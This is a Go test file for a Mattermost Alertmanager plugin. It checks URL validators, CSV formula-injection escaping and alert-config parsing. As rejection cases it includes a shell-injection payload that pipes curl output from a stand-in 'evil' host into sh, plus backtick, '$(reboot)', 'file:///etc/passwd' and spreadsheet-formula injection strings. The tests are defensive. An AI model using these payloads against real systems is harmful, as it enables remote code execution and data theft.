package main

import (
	"strings"
	"testing"
)

// TestValidateWebhookHost guards the only sysadmin-typed setting in the
// plugin's System Console form. Garbage here propagates straight into
// alertmanager.yml and breaks every webhook URL we render, so each
// rejection branch needs to actually fire.
func TestValidateWebhookHost(t *testing.T) {
	cases := []struct {
		name    string
		input   string
		wantErr bool
		errFrag string
	}{
		{"empty is valid", "", false, ""},
		{"whitespace-only is valid", "   ", false, ""},
		{"http URL is valid", "http://mattermost.example.com", false, ""},
		{"https URL is valid", "https://mattermost.example.com", false, ""},
		{"https with port is valid", "https://mattermost.example.com:8443", false, ""},
		{"missing scheme is rejected", "mattermost.example.com", true, "http"},
		{"ftp scheme is rejected", "ftp://mattermost.example.com", true, "http"},
		{"file scheme is rejected", "file:///etc/passwd", true, "http"},
		{"empty host is rejected", "https://", true, "host"},
		{"path is rejected", "https://mattermost.example.com/plugins", true, "path"},
		{"trailing slash alone is allowed", "https://mattermost.example.com/", false, ""},
		{"query string is rejected", "https://mattermost.example.com?foo=bar", true, "query"},
		{"fragment is rejected", "https://mattermost.example.com#section", true, "query"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := validateWebhookHost(tc.input)
			if tc.wantErr && err == nil {
				t.Fatalf("expected error for %q, got nil", tc.input)
			}
			if !tc.wantErr && err != nil {
				t.Fatalf("expected no error for %q, got %v", tc.input, err)
			}
			if tc.errFrag != "" && err != nil && !strings.Contains(err.Error(), tc.errFrag) {
				t.Fatalf("error %q does not contain expected fragment %q", err.Error(), tc.errFrag)
			}
		})
	}
}

// TestValidateAlertManagerURL is the CL-03/CL-21 guard: the AM URL renders into
// a copy-paste `curl` shell fence and a CSV a sysadmin opens, so the validator
// must reject shell/CSV injection and SSRF-shaped values while accepting the
// legitimate host[:port][/path] forms.
func TestValidateAlertManagerURL(t *testing.T) {
	cases := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"empty is valid (URL is optional)", "", false},
		{"plain host:port", "http://alertmanager:9093", false},
		{"https host", "https://am.example.com", false},
		{"reverse-proxy path prefix", "https://obs.example.com/alertmanager", false},
		{"IPv6 literal", "http://[::1]:9093", false},
		{"trailing slash only", "http://am:9093/", false},
		{"ftp scheme rejected", "ftp://am:9093", true},
		{"embedded credentials rejected", "http://user:pass@am:9093", true},
		{"query string rejected", "http://am:9093?x=y", true},
		{"fragment rejected", "http://am:9093#frag", true},
		{"non-numeric port rejected", "http://am:xyz", true},
		// The headline injection: survives strings.Fields via ${IFS}, would land
		// unquoted in `curl -X POST <url>/-/reload`.
		{"shell command substitution rejected", "http://am:9093$(curl${IFS}-s${IFS}http://evil|sh)", true},
		{"backtick in host rejected", "http://am`whoami`:9093", true},
		{"shell-danger path rejected", "http://am:9093/$(reboot)", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := validateAlertManagerURL(tc.input)
			if tc.wantErr && err == nil {
				t.Fatalf("expected error for %q, got nil", tc.input)
			}
			if !tc.wantErr && err != nil {
				t.Fatalf("expected no error for %q, got %v", tc.input, err)
			}
		})
	}
}

// TestCSVSafe pins the CL-21 formula-injection neutralization: formula-leading
// cells get a quote prefix, benign cells are untouched.
func TestCSVSafe(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"", ""},
		{"http://am:9093", "http://am:9093"},
		{"high-cpu-usage--team-chan", "high-cpu-usage--team-chan"},
		{`=HYPERLINK("http://evil/x","OK")`, `'=HYPERLINK("http://evil/x","OK")`},
		{"+WEBSERVICE(A1)", "'+WEBSERVICE(A1)"},
		{"-2+3", "'-2+3"},
		{"@SUM(A1)", "'@SUM(A1)"},
		{"\ttabbed", "'\ttabbed"},
	}
	for _, tc := range cases {
		if got := csvSafe(tc.in); got != tc.want {
			t.Errorf("csvSafe(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// TestResolveWebhookHost pins the precedence between the WebhookHost free-text
// field and the WebhookHostPreset dropdown. The custom-wins rule is what keeps
// existing installs (which only ever had the text field) behaving identically
// after the dropdown was added — a regression here would silently repoint every
// webhook URL.
func TestResolveWebhookHost(t *testing.T) {
	cases := []struct {
		name   string
		custom string
		preset string
		want   string
	}{
		{"both empty falls through to SiteURL", "", "", ""},
		{"preset only", "", "http://host.docker.internal:8065", "http://host.docker.internal:8065"},
		{"custom only", "https://mm.example.com", "", "https://mm.example.com"},
		{"custom wins over preset", "https://mm.example.com", "http://host.docker.internal:8065", "https://mm.example.com"},
		{"whitespace custom is ignored, preset used", "   ", "http://host.docker.internal:8065", "http://host.docker.internal:8065"},
		{"custom is trimmed", "  https://mm.example.com  ", "", "https://mm.example.com"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := resolveWebhookHost(tc.custom, tc.preset); got != tc.want {
				t.Fatalf("resolveWebhookHost(%q, %q) = %q, want %q", tc.custom, tc.preset, got, tc.want)
			}
		})
	}
}

// TestAlertConfigIsValid covers the per-entry invariant rules. Each
// branch in IsValid corresponds to a misconfiguration mode an admin
// could ship by hand-editing the JSON blob in System Console — these
// tests are the first line of defense before the bad entry gets a
// chance to corrupt the live configuration.
func TestAlertConfigIsValid(t *testing.T) {
	good := alertConfig{
		Name:      "high-cpu-usage--alerts",
		Team:      "ops",
		Channel:   "alerts",
		WebhookID: "abc123def456",
	}

	if err := good.IsValid(); err != nil {
		t.Fatalf("expected valid baseline to pass, got %v", err)
	}

	cases := []struct {
		name    string
		mutate  func(*alertConfig)
		errFrag string
	}{
		{"empty name", func(c *alertConfig) { c.Name = "" }, "invalid name"},
		{"name starts with hyphen", func(c *alertConfig) { c.Name = "-bad" }, "invalid name"},
		{"name has uppercase", func(c *alertConfig) { c.Name = "HighCPU" }, "invalid name"},
		{"name has spaces", func(c *alertConfig) { c.Name = "high cpu" }, "invalid name"},
		{"name too long", func(c *alertConfig) { c.Name = strings.Repeat("a", 191) }, "invalid name"},
		{"empty team", func(c *alertConfig) { c.Team = "" }, "team"},
		{"empty channel", func(c *alertConfig) { c.Channel = "" }, "channel"},
		{"empty webhookID", func(c *alertConfig) { c.WebhookID = "" }, "webhookID"},
		{"user without password", func(c *alertConfig) { c.User = "u" }, "user and password"},
		{"password without user", func(c *alertConfig) { c.Password = "p" }, "user and password"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cfg := good
			tc.mutate(&cfg)
			err := cfg.IsValid()
			if err == nil {
				t.Fatalf("expected error for case %s, got nil", tc.name)
			}
			if !strings.Contains(err.Error(), tc.errFrag) {
				t.Fatalf("error %q does not contain %q", err.Error(), tc.errFrag)
			}
		})
	}
}

// TestParseAlertConfigs covers the JSON-decode + validation pipeline
// the System Console runs on every settings save. The full set of
// failure modes (syntax error, type error, duplicate name, duplicate
// webhookID, individual validation failure) gets exercised here — these
// are the messages an admin sees when they hand-edit the JSON blob and
// the error text is what guides them to the fix.
func TestParseAlertConfigs(t *testing.T) {
	t.Run("empty input is valid", func(t *testing.T) {
		entries, err := parseAlertConfigs("")
		if err != nil {
			t.Fatalf("expected no error, got %v", err)
		}
		if entries != nil {
			t.Fatalf("expected nil entries, got %v", entries)
		}
	})

	t.Run("whitespace-only input is valid", func(t *testing.T) {
		entries, err := parseAlertConfigs("   \n\t  ")
		if err != nil {
			t.Fatalf("expected no error, got %v", err)
		}
		if entries != nil {
			t.Fatalf("expected nil entries, got %v", entries)
		}
	})

	t.Run("valid single entry parses", func(t *testing.T) {
		blob := `[{"name":"high-cpu-usage--alerts","team":"ops","channel":"alerts","webhookID":"abc123"}]`
		entries, err := parseAlertConfigs(blob)
		if err != nil {
			t.Fatalf("expected no error, got %v", err)
		}
		if len(entries) != 1 {
			t.Fatalf("expected 1 entry, got %d", len(entries))
		}
		if entries[0].Name != "high-cpu-usage--alerts" {
			t.Fatalf("wrong name: %s", entries[0].Name)
		}
	})

	t.Run("trailing slash on alertManagerURL is trimmed", func(t *testing.T) {
		blob := `[{"name":"x","team":"ops","channel":"alerts","webhookID":"w1","alertManagerURL":"http://am.example.com/"}]`
		entries, err := parseAlertConfigs(blob)
		if err != nil {
			t.Fatalf("expected no error, got %v", err)
		}
		if entries[0].AlertManagerURL != "http://am.example.com" {
			t.Fatalf("expected trimmed URL, got %q", entries[0].AlertManagerURL)
		}
	})

	t.Run("syntax error surfaces byte offset", func(t *testing.T) {
		_, err := parseAlertConfigs(`[{not valid json}]`)
		if err == nil {
			t.Fatal("expected syntax error")
		}
		if !strings.Contains(err.Error(), "byte offset") {
			t.Fatalf("expected byte offset in error, got %q", err.Error())
		}
	})

	t.Run("type error surfaces field name", func(t *testing.T) {
		blob := `[{"name":123,"team":"ops","channel":"alerts","webhookID":"w1"}]`
		_, err := parseAlertConfigs(blob)
		if err == nil {
			t.Fatal("expected type error")
		}
		if !strings.Contains(err.Error(), "type error") {
			t.Fatalf("expected type error, got %q", err.Error())
		}
	})

	t.Run("duplicate name is rejected", func(t *testing.T) {
		blob := `[
			{"name":"x","team":"ops","channel":"alerts","webhookID":"w1"},
			{"name":"x","team":"ops","channel":"alerts","webhookID":"w2"}
		]`
		_, err := parseAlertConfigs(blob)
		if err == nil {
			t.Fatal("expected duplicate-name error")
		}
		if !strings.Contains(err.Error(), "duplicate") {
			t.Fatalf("expected duplicate error, got %q", err.Error())
		}
	})

	t.Run("shared webhookID with matching team+channel+group is allowed", func(t *testing.T) {
		// v1.0.3+ group webhooks: N receivers in the same group share
		// one webhookID. Validates that the constraint relaxation works.
		blob := `[
			{"name":"high-cpu-usage--alerts","team":"ops","channel":"alerts","webhookID":"w1","groupName":"compute"},
			{"name":"high-memory-usage--alerts","team":"ops","channel":"alerts","webhookID":"w1","groupName":"compute"}
		]`
		entries, err := parseAlertConfigs(blob)
		if err != nil {
			t.Fatalf("expected no error for shared webhookID within group, got %v", err)
		}
		if len(entries) != 2 {
			t.Fatalf("expected 2 entries, got %d", len(entries))
		}
		if entries[0].WebhookID != entries[1].WebhookID {
			t.Fatalf("webhookID should be shared; got %q vs %q", entries[0].WebhookID, entries[1].WebhookID)
		}
	})

	t.Run("shared webhookID across mismatched groups is rejected", func(t *testing.T) {
		// Catches the bad-state cases: hand-edit error or plugin bug
		// where one webhookID gets claimed by two different groups.
		// Realistic 32-hex webhook ID so the redaction assertion has teeth (a
		// 2-char token trivially wouldn't reappear in a sha256 fingerprint).
		const sharedHook = "abcdef0123456789abcdef0123456789"
		blob := `[
			{"name":"x--alerts","team":"ops","channel":"alerts","webhookID":"` + sharedHook + `","groupName":"compute"},
			{"name":"y--alerts","team":"ops","channel":"alerts","webhookID":"` + sharedHook + `","groupName":"database"}
		]`
		_, err := parseAlertConfigs(blob)
		if err == nil {
			t.Fatal("expected error for mismatched groups sharing webhookID")
		}
		if !strings.Contains(err.Error(), "sharing requires matching team+channel+group") {
			t.Fatalf("expected a webhook-sharing conflict error, got %q", err.Error())
		}
		// The raw webhook ID (a bearer token) must not leak into the error (CL-13).
		if strings.Contains(err.Error(), sharedHook) {
			t.Fatalf("error leaked the raw webhook ID: %q", err.Error())
		}
	})

	t.Run("shared webhookID across mismatched channels is rejected", func(t *testing.T) {
		blob := `[
			{"name":"x--alerts","team":"ops","channel":"alerts","webhookID":"w1","groupName":"compute"},
			{"name":"y--oncall","team":"ops","channel":"oncall","webhookID":"w1","groupName":"compute"}
		]`
		_, err := parseAlertConfigs(blob)
		if err == nil {
			t.Fatal("expected error for mismatched channels sharing webhookID")
		}
	})

	t.Run("legacy empty groupName still gets per-receiver webhook validation", func(t *testing.T) {
		// Pre-v1.0.3 receivers have empty groupName. Two of them with
		// matching empty group + same team+channel CAN share a webhookID
		// under the new rules (since all fields match), but a legacy
		// install would never produce that state — every old receiver
		// got its own webhook. Just confirms the validation doesn't
		// barf on legacy shape.
		blob := `[
			{"name":"a--alerts","team":"ops","channel":"alerts","webhookID":"w1"},
			{"name":"b--alerts","team":"ops","channel":"alerts","webhookID":"w2"}
		]`
		entries, err := parseAlertConfigs(blob)
		if err != nil {
			t.Fatalf("legacy shape should still validate, got %v", err)
		}
		if len(entries) != 2 {
			t.Fatalf("expected 2 entries, got %d", len(entries))
		}
		if entries[0].GroupName != "" || entries[1].GroupName != "" {
			t.Fatalf("expected empty GroupName for legacy entries")
		}
	})

	t.Run("individual entry validation failure surfaces index", func(t *testing.T) {
		blob := `[
			{"name":"valid--alerts","team":"ops","channel":"alerts","webhookID":"w1"},
			{"name":"BadName","team":"ops","channel":"alerts","webhookID":"w2"}
		]`
		_, err := parseAlertConfigs(blob)
		if err == nil {
			t.Fatal("expected validation error")
		}
		if !strings.Contains(err.Error(), "alertConfig[1]") {
			t.Fatalf("expected index in error, got %q", err.Error())
		}
	})
}
